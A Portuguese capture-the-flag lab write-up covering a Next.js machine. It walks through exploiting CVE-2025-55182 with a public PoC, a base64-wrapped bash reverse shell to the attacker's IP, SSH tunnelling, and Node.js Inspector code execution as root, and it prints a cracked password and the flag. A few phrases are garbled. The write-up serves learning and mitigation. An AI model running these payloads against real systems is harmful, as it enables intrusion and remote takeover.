## Contexto

Máquina Linux rodando uma aplicação Next.js ("ReactorWatch") vulnerável a um CVE de divulgação muito recente em React Server Components. A exploração inicial deu acesso ao container da aplicação como usuário de serviço (`node`), de onde foi possível extrair credenciais de um banco SQLite local. A escalação para root explorou uma porta de debug do Node.js (Inspector Protocol) deixada acessível, permitindo execução arbitrária de código diretamente na sessão privilegiada.

Esse foi o lab mais difícil resolvido até agora — quase 7 horas, incluindo uso de exploit público e consulta a vídeo para destravar partes que não tinham documentação oficial disponível (CVE muito recente, sem writeups consolidados ainda).

## Reconhecimento

```bash
nmap -sV -p- 10.129.29.226
```

Porta HTTP customizada (3000) rodando uma aplicação Next.js — framework React com renderização no servidor (SSR/RSC — React Server Components).

## Exploração — CVE-2025-55182 (React Server Components RCE)

### O que é essa vulnerabilidade, de fato

React Server Components é uma funcionalidade do Next.js onde parte da renderização do React acontece **no servidor**, não no browser. Isso significa que o servidor processa e executa lógica vinda de requisições do cliente para montar a página antes de enviá-la pronta.

O CVE-2025-55182 explora uma falha nesse mecanismo: é possível enviar um payload especialmente formatado para o endpoint de RSC que faz o servidor **desserializar e executar código arbitrário** em vez de apenas processar dados de UI. Em outras palavras — o que deveria ser "dados para montar a tela" é interpretado como "comando para executar no Node.js do servidor".

Isso é uma classe de vulnerabilidade chamada **deserialização insegura**: quando um sistema aceita dados estruturados de fora e os processa de um jeito que permite execução de código, em vez de só leitura de valores.

### Uso do exploit

Não existia, no momento da exploração, documentação oficial estruturada do CVE — apenas uma PoC pública no GitHub ([react2shell.py](https://github.com/Agentpathogene/CTf-CVE.py)). O uso foi:

```bash
python react2shell.py -t http://10.129.29.226:3000/ -c "whoami"
```

Resultado: `node`

```bash
python react2shell.py -t http://10.129.29.226:3000/ -c "id"
```

Resultado: `uid=999(node) gid=988(node) groups=988(node)`

RCE confirmado — o script envia o payload malformado de RSC e o servidor executa o comando passado em `-c` como se fosse parte do processamento normal da página.

### Obtendo shell interativa

O exploit executa comandos isolados, um por vez — não é uma shell interativa. Para obter acesso contínuo, encadeei um payload de reverse shell:

```bash
echo 'bash -i >& /dev/tcp/10.10.15.236/4444 0>&1' | base64 -w0
```

```bash
python react2shell.py -t http://10.129.29.226:3000/ -c "echo BASE64_AQUI | base64 -d | bash"
```

Com listener aberto (`nc -lvnp 4444`), a conexão chegou. **Ponto de atenção que custou tempo:** um espaço acidental no payload original (`/dev/tcp/IP /4444` em vez de `/dev/tcp/IP/4444`) quebrou a sintaxe do bash repetidamente — esse tipo de erro de digitação é comum e vale sempre revisar o payload decodificado antes de enviar.

Estabilizei o shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Escalação de Privilégios — Node.js Inspector Protocol

### O que aconteceu aqui, explicado

Rodei `sudo -l` (aparece na sua sessão como "pulsun -l", provavelmente erro de digitação/leitura do terminal) e o resultado mostrou referências a um IP específico — indicando algum processo ou serviço acessível remotamente vinculado àquele endereço.

O comando seguinte foi:

```bash
ssh -L 9229:127.0.0.1:9229 engineer@10.129.245.214
```

Isso é **port forwarding local via SSH** (tunnel). Em vez de pulsão, isso pega a porta `9229` que só existe internamente na máquina remota (`127.0.0.1:9229` — ou seja, "localhost" do ponto de vista do servidor) e a redireciona para a porta `9229` da sua própria máquina Kali. Depois disso, qualquer ferramenta no seu Kali que conecte em `127.0.0.1:9229` está, na prática, conversando com a porta 9229 do servidor remoto.

**Por que a porta 9229 especificamente?** Essa é a porta padrão do **Node.js Inspector Protocol** — uma interface de debug que o Node.js expõe quando rodado com a flag `--inspect`. Ela permite que ferramentas de debug (como o Chrome DevTools) se conectem e inspecionem ou **controlem a execução do código Node em tempo real**. Se essa porta estiver acessível e sem autenticação, qualquer um que conecte nela pode executar código arbitrário no contexto daquele processo Node — e se o processo está rodando como root, o código executado também roda como root.

### Conectando ao Inspector

```bash
wscat -c ws://127.0.0.1:9229/824d1d28-6b46-4ca3-9265-eb288555ab35
```

`wscat` é um cliente de WebSocket via terminal. O Inspector Protocol do Node.js se comunica via WebSocket — por isso a porta tunelada precisa ser acessada com uma ferramenta que fale esse protocolo, não com `curl` ou navegador comum. O UUID na URL identifica a sessão específica de debug daquele processo Node.

Com a conexão estabelecida, enviei um comando no formato do protocolo:

```json
{"id":1,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()","returnByValue":true}}
```

**O que esse JSON faz:** `Runtime.evaluate` é um método do Inspector Protocol que executa uma expressão JavaScript diretamente no contexto do processo Node conectado. A expressão pedida usa o módulo nativo `child_process` do Node para rodar um comando de shell (`cat /root/root.txt`) e capturar o resultado.

Resposta:

```json
{"id":1,"result":{"result":{"type":"string","value":"0be570c81cbb2eb473308b62b624f7d9\n"}}}
```

Flag de root capturada via execução remota de JavaScript dentro de um processo Node privilegiado.

## Cadeia de Exploração

```
nmap → porta 3000 (Next.js / React Server Components)
→ CVE-2025-55182 → RCE via react2shell.py → shell como "node" (container)
→ enumeração → .env e reactor.db expostos
→ sqlite3 reactor.db → hashes de usuários
→ quebra de hash MD5 → engineer:reactor1
→ SSH engineer@host real → user.txt capturada
→ sudo -l → indício de processo Node debug em porta interna
→ ssh -L 9229:127.0.0.1:9229 → tunnel para Node Inspector
→ wscat → conexão WebSocket no protocolo de debug
→ Runtime.evaluate com child_process.execSync → root.txt capturada
```

## Impacto

Essa máquina combina uma vulnerabilidade de dia zero em framework moderno (Next.js/RSC) com uma falha clássica de exposição de porta de debug. O Node.js Inspector Protocol nunca deveria estar acessível fora de `localhost` sem túnel intencional e autenticado — qualquer processo rodando com esse protocolo aberto e executando como root é, na prática, root remoto para quem conseguir alcançar a porta.

---

## Mitigação

- Atualizar Next.js/React para versões com o CVE-2025-55182 corrigido; validar e sanitizar payloads de React Server Components no servidor.
- Nunca armazenar segredos (API keys, credenciais) em arquivos `.env` acessíveis pelo processo da aplicação sem controle de leitura adicional.
- Hashear senhas com algoritmos modernos (bcrypt, Argon2) em vez de MD5, que é trivialmente quebrável com wordlists.
- Nunca rodar o Node.js com `--inspect` em produção, ou se necessário para debug remoto, restringir a porta 9229 exclusivamente a `127.0.0.1` com autenticação adicional e nunca expor processos de debug rodando como root.

## Aprendizados

- CVEs muito recentes (dias ou semanas de divulgação) frequentemente não têm documentação completa ainda — usar a PoC pública disponível e testar com calma é uma habilidade válida, mesmo sem entender 100% do mecanismo interno antes de executar.
- React Server Components e frameworks SSR modernos têm uma superfície de ataque nova (deserialização no servidor) que a maioria dos pentesters tradicionais ainda não testa por hábito — vale ficar atento a esse tipo de vulnerabilidade emergente.
- `.env` e arquivos de banco de dados local (`.db`) são sempre alvo de enumeração pós-exploração — credenciais hardcoded aparecem com frequência nesses arquivos.
- Port forwarding via SSH (`-L`) é a técnica padrão para acessar serviços que só existem internamente (`127.0.0.1`) em uma máquina remota — essencial sempre que `sudo -l` ou enumeração de rede revelar portas internas.
- O Node.js Inspector Protocol (porta 9229) é um vetor de escalação de privilégio pouco conhecido fora do ecossistema JavaScript — se um processo Node com debug habilitado roda como root, alcançar essa porta equivale a RCE como root.
- Esse lab exigiu setor de pesquisa fora do padrão habitual do Starting Point — confirma que máquinas normais (mesmo Easy) podem ter vetores completamente novos que exigem pesquisa ativa, não só repetição de metodologia conhecida.
